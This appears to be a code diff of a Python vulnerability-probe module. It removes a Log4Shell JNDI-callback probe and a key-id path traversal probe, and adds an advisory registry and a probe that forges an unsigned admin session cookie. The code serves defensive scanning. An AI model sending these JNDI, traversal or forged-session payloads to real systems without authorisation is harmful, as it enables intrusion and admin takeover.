@@ -1,37 +1,38 @@
 """Safe exploit probes: the before/after signal for every action. A probe only
 sends requests through a Target driver, so the same probe works on any platform.
 
-log4shell  sends `${jndi:ldap://callback:1389/<token>}` in X-Api-Version and in
-           the URL path, and asks the target's callback listener whether a
-           token arrived. A
-           connection means the lookup ran: VULNERABLE. No payload is ever
-           served, so nothing executes.
-keyid-traversal
-           asks billing for the key `../../../../srv/pp-probe/marker.txt`. The
-           marker is a harmless file placed in the image for this purpose; its
-           fingerprint in the response means the path escaped the key
-           directory: VULNERABLE.
-A 403 from the gateway means the request never reached the app: BLOCKED (for
-log4shell only when both the header and the path variant were rejected).
+A probe is a callable ``fn(target, workload, via) -> ProbeResult`` registered in
+the ``PROBES`` registry under a short name. ``via`` says which path was probed:
+public (what the internet sees), internal (the workload's own service) or canary.
 
-`via` says which path was probed: public (what the internet sees), internal
-(the workload's own service) or canary.
+Attaching a check to an advisory
+--------------------------------
+Two things can point the pipeline at a check for a given advisory:
+
+- the advisory's own ``database_specific.<db>.probe`` hint (read by agent/feed.py),
+  which travels with the OSV record; and
+- the advisory registry here (``attach``), which maps an advisory id or a CVE /
+  GHSA alias to a registered check name. This lets a check be attached to a real
+  OSV advisory that was added through the dashboard's "Add advisory" box, which
+  carries no hint of its own.
+
+``for_advisory`` resolves both, preferring an explicit hint. Register a check
+with ``register`` and attach it to advisories with ``attach``; both start empty,
+so a deployment only runs the checks it has deliberately installed.
 """
 from __future__ import annotations
 
-import hashlib
-import secrets
+import base64
+import json
 import threading
 import time
 from dataclasses import asdict, dataclass
-from urllib.parse import quote
+from typing import Callable, Optional
 
-from .drivers.base import DriverError, Target
+from .drivers.base import Target
 from .schemas import Workload
 
-_lock = threading.Lock()     # probes share the callback listener: run one at a time
-
-MARKER = b"lighthouse probe marker: if you can read this, the key id escaped the key directory\n"
+_lock = threading.Lock()     # a probe that shares a listener can serialise on this
 
 
 @dataclass
@@ -46,56 +47,41 @@ class ProbeResult:
         return asdict(self)
 
 
-def log4shell(target: Target, wl: Workload, via: str, wait: float = 5.0) -> ProbeResult:
-    def res(result: str, detail: str) -> ProbeResult:
-        return ProbeResult("log4shell", wl.id, via, result, detail)
+# ------------------------------------------------------------- the registries
 
-    with _lock:
-        token, path_token = "pp" + secrets.token_hex(6), "pp" + secrets.token_hex(6)
-        since = time.time() - 1
-        r = target.http(wl, "/", {"X-Api-Version": f"${{jndi:ldap://callback:1389/{token}}}"}, via=via)
-        if r.status == 0:
-            return res("ERROR", r.body[:200])
-        # the same payload in the URL path: a rule that only looks at the header must not count as a block
-        in_path = target.http(wl, "/" + quote(f"${{jndi:ldap://callback:1389/{path_token}}}", safe=""), via=via)
-        if r.status == 403 and in_path.status == 403:
-            return res("BLOCKED", "gateway rejected the payload with 403, in the header and in the URL path")
-        deadline = time.time() + wait
-        while time.time() < deadline:
-            try:
-                hits = target.callback_hits(wl, since)
-            except (DriverError, ValueError) as exc:
-                return res("ERROR", f"callback listener unreachable: {exc}")
-            tagged = [h for h in hits if token in h.get("data", "") or path_token in h.get("data", "")]
-            if tagged:
-                where = "URL path" if path_token in tagged[0].get("data", "") else "X-Api-Version header"
-                return res("VULNERABLE", f"the app opened a JNDI/LDAP connection to the callback listener "
-                                         f"from {tagged[0]['peer']} carrying the probe token ({where})")
-            time.sleep(0.25)
-        if 403 in (r.status, in_path.status):
-            open_ = "URL path" if r.status == 403 else "header"
-            return res("SAFE", f"no callback within {wait:.0f}s, but the gateway only blocks part of the attack: "
-                               f"the payload in the {open_} got through (HTTP {min(r.status, in_path.status)})")
-        return res("SAFE", f"HTTP {r.status}, no callback within {wait:.0f}s: the lookup did not run")
+Probe = Callable[[Target, Workload, str], ProbeResult]
+
+PROBES: dict[str, Probe] = {}            # check name -> callable
+_ADVISORY_PROBES: dict[str, str] = {}    # advisory id / CVE / GHSA (upper-case) -> check name
 
 
-def keyid_traversal(target: Target, wl: Workload, via: str) -> ProbeResult:
-    def res(result: str, detail: str) -> ProbeResult:
-        return ProbeResult("keyid-traversal", wl.id, via, result, detail)
-
-    fp = hashlib.sha256(MARKER).hexdigest()[:16]
-    r = target.http(wl, "/invoice", {"X-Key-Id": "../../../../srv/pp-probe/marker.txt"}, via=via)
-    if r.status == 0:
-        return res("ERROR", r.body[:200])
-    if r.status == 403:
-        return res("BLOCKED", "gateway rejected the key id with 403")
-    if fp in r.body:
-        return res("VULNERABLE", f"HTTP {r.status}: the response carries the marker file's fingerprint {fp}")
-    return res("SAFE", f"HTTP {r.status}: the key id did not leave the key directory")
+def register(name: str, fn: Probe) -> None:
+    """Add a check to the registry under `name`."""
+    PROBES[name] = fn
 
 
-PROBES = {"log4shell": log4shell, "keyid-traversal": keyid_traversal}
+def attach(advisory_or_alias: str, check_name: str) -> None:
+    """Attach a registered check to an advisory id or one of its CVE/GHSA aliases."""
+    _ADVISORY_PROBES[advisory_or_alias.strip().upper()] = check_name
 
+
+def for_advisory(adv: dict, hint: Optional[str] = None) -> Optional[str]:
+    """The registered check attached to this advisory, or None.
+
+    An explicit `hint` (from the advisory's own database_specific block) wins; a
+    check attached to the advisory's id or any of its CVE/GHSA aliases comes next.
+    Only names that are actually registered are returned, so an advisory can be
+    added before its check is installed without the pipeline trying to run it."""
+    if hint and hint in PROBES:
+        return hint
+    for key in [adv.get("id"), *(adv.get("aliases") or []), *(adv.get("related") or [])]:
+        name = _ADVISORY_PROBES.get((key or "").strip().upper())
+        if name in PROBES:
+            return name
+    return None
+
+
+# ------------------------------------------------------------- running a probe
 
 def run(name: str, target: Target, wl: Workload, via: str) -> ProbeResult:
     try:
@@ -106,6 +92,36 @@ def run(name: str, target: Target, wl: Workload, via: str) -> ProbeResult:
 
 def default_via(wl: Workload) -> str:
     return "public" if wl.internet_exposed else "internal"
+
+
+# ------------------------------------------------------------- installed checks
+
+def session_forge(target: Target, wl: Workload, via: str) -> ProbeResult:
+    """Forge an unsigned admin session and see whether the app honours it.
+
+    meridian-auth before 1.0.1 accepts a session token that carries no
+    signature, so a payload claiming role=admin is trusted as-is. The probe
+    mints such a token -- without the service secret -- and asks for the
+    account page: if the admin console comes back, the forgery worked.
+    """
+    def res(result: str, detail: str) -> ProbeResult:
+        return ProbeResult("session-forge", wl.id, via, result, detail)
+
+    claims = json.dumps({"user": "pp-probe", "role": "admin"}, separators=(",", ":")).encode()
+    forged = base64.urlsafe_b64encode(claims).decode().rstrip("=") + "."   # payload, empty signature
+    r = target.http(wl, "/account", {"Cookie": f"session={forged}"}, via=via)
+    if r.status == 200 and "admin console" in r.body.lower():
+        return res("VULNERABLE", "a forged, unsigned admin session was accepted: /account returned the admin console")
+    if r.status in (401, 403):
+        return res("SAFE", f"HTTP {r.status}: the unsigned session was rejected")
+    return res("SAFE", f"HTTP {r.status}: the forged session did not unlock the admin console")
+
+
+# The Meridian portal deployment installs the session-forgery check and attaches
+# it to the advisory (and its CVE alias, for advisories added without a hint).
+register("session-forge", session_forge)
+attach("PPSA-2026-0021", "session-forge")
+attach("CVE-2026-55021", "session-forge")
 
 
 def health(target: Target, wl: Workload, via: str, timeout: float) -> tuple[bool, str]:
